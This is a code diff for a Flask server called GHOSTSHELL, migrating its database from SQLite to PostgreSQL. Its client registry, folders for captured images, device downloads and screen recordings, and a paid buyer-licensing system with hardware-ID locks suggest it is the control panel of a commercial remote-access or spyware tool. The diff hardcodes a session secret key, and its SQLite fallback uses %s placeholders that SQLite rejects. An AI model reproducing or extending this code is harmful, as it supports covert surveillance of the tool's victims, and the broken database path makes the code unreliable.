@@ -5,45 +5,71 @@ import base64
 import os
 import time
 import sqlite3
+import psycopg2
+import psycopg2.extras
 from datetime import datetime, timedelta
 from flask import Flask, request, jsonify, render_template, send_from_directory, redirect, url_for, session
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
-app.secret_key = 'GHOSTSHELL_SECRET_KEY_999' # Buat session flask
+app.secret_key = 'GHOSTSHELL_SECRET_KEY_999'
 
 clients = {}
 server_logs = []
 file_transfers = {}
 lock = threading.Lock()
 
-DB_PATH = 'ghostshell.db'
+# --- DATABASE ENGINE SELECTION ---
+# Railway bakal otomatis ngasih DATABASE_URL kalau lu link service-nya
+DATABASE_URL = os.environ.get('DATABASE_URL')
 
-# --- DATABASE LOGIC ---
 def get_db():
-    conn = sqlite3.connect(DB_PATH)
-    conn.row_factory = sqlite3.Row
-    return conn
+    if DATABASE_URL:
+        # PAKE POSTGRESQL (Railway Mode)
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        return conn
+    else:
+        # PAKE SQLITE (Lokal Mode)
+        conn = sqlite3.connect('ghostshell.db')
+        return conn
 
 def init_db():
     conn = get_db()
-    conn.execute('''
+    cur = conn.cursor()
+    
+    # Syntax PostgreSQL dikit beda (pake BIGSERIAL atau SERIAL buat PK)
+    # Tapi standar IF NOT EXISTS tetep aman
+    query = '''
         CREATE TABLE IF NOT EXISTS buyers (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            id SERIAL PRIMARY KEY,
             uid TEXT UNIQUE NOT NULL,
             locked_hwid TEXT DEFAULT NULL,
             expiry_date TIMESTAMP NOT NULL,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
-    ''')
+    '''
+    cur.execute(query)
     conn.commit()
+    cur.close()
     conn.close()
-    print("[GHOSTSHELL] > Database SQLite Active.")
+    print("[GHOSTSHELL] > DB Initialized ({} Mode)".format("PostgreSQL" if DATABASE_URL else "SQLite"))
 
 # Folder initialization
 DIRS = ['captured_images', 'device_downloads', 'screen_recordings']
 for d in DIRS:
     if not os.path.exists(d): os.makedirs(d)
+
+# Helper buat handle row query (Biar PostgreSQL outputnya mirip SQLite Dict)
+def fetch_all_as_dict(cursor):
+    columns = [column[0] for column in cursor.description]
+    return [dict(zip(columns, row)) for row in cursor.fetchall()]
+
+def fetch_one_as_dict(cursor):
+    if cursor.rowcount == 0: return None
+    row = cursor.fetchone()
+    if not row: return None
+    columns = [column[0] for column in cursor.description]
+    return dict(zip(columns, row))
 
 def add_log(msg):
     t = time.strftime("%H:%M:%S")
@@ -155,7 +181,10 @@ def admin_login_page():
 def admin_dashboard():
     if not session.get('is_admin'): return redirect(url_for('admin_login_page'))
     conn = get_db()
-    users = conn.execute('SELECT * FROM buyers ORDER BY created_at DESC').fetchall()
+    cur = conn.cursor()
+    cur.execute('SELECT * FROM buyers ORDER BY created_at DESC')
+    users = fetch_all_as_dict(cur)
+    cur.close()
     conn.close()
     return render_template('admin.html', view='dashboard', users=users)
 
@@ -170,27 +199,34 @@ def buyer_login():
     if not uid or not hwid: return jsonify({"status": "error", "message": "UID & HWID REQUIRED"}), 400
     
     conn = get_db()
-    user = conn.execute('SELECT * FROM buyers WHERE uid = ?', (uid,)).fetchone()
+    cur = conn.cursor()
+    cur.execute('SELECT * FROM buyers WHERE uid = %s', (uid,))
+    user = fetch_one_as_dict(cur)
     
     if not user:
+        cur.close()
         conn.close()
         return jsonify({"status": "error", "message": "UID NOT REGISTERED"}), 401
     
     # Check Expiry
-    expiry = datetime.strptime(user['expiry_date'], '%Y-%m-%d %H:%M:%S')
+    expiry = user['expiry_date']
+    if isinstance(expiry, str): expiry = datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S')
     if expiry < datetime.now():
+        cur.close()
         conn.close()
         return jsonify({"status": "error", "message": "ACCOUNT EXPIRED"}), 403
     
     # Check HWID
     if user['locked_hwid'] is None:
         # First login binding
-        conn.execute('UPDATE buyers SET locked_hwid = ? WHERE uid = ?', (hwid, uid))
+        cur.execute('UPDATE buyers SET locked_hwid = %s WHERE uid = %s', (hwid, uid))
         conn.commit()
     elif user['locked_hwid'] != hwid:
+        cur.close()
         conn.close()
         return jsonify({"status": "error", "message": "LOCKED TO ANOTHER DEVICE"}), 403
     
+    cur.close()
     conn.close()
     return jsonify({"status": "ok"})
 
@@ -215,12 +251,14 @@ def create_user():
     data = request.json
     uid = data.get('uid')
     days = int(data.get('days', 30))
-    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
+    expiry = datetime.now() + timedelta(days=days)
     
     try:
         conn = get_db()
-        conn.execute('INSERT INTO buyers (uid, expiry_date) VALUES (?, ?)', (uid, expiry))
+        cur = conn.cursor()
+        cur.execute('INSERT INTO buyers (uid, expiry_date) VALUES (%s, %s)', (uid, expiry))
         conn.commit()
+        cur.close()
         conn.close()
         return jsonify({"status": "ok"})
     except Exception as e:
@@ -231,8 +269,10 @@ def reset_hwid():
     if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
     uid = request.json.get('uid')
     conn = get_db()
-    conn.execute('UPDATE buyers SET locked_hwid = NULL WHERE uid = ?', (uid,))
+    cur = conn.cursor()
+    cur.execute('UPDATE buyers SET locked_hwid = NULL WHERE uid = %s', (uid,))
     conn.commit()
+    cur.close()
     conn.close()
     return jsonify({"status": "ok"})
 
@@ -241,8 +281,10 @@ def delete_user():
     if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
     uid = request.json.get('uid')
     conn = get_db()
-    conn.execute('DELETE FROM buyers WHERE uid = ?', (uid,))
+    cur = conn.cursor()
+    cur.execute('DELETE FROM buyers WHERE uid = %s', (uid,))
     conn.commit()
+    cur.close()
     conn.close()
     return jsonify({"status": "ok"})
 
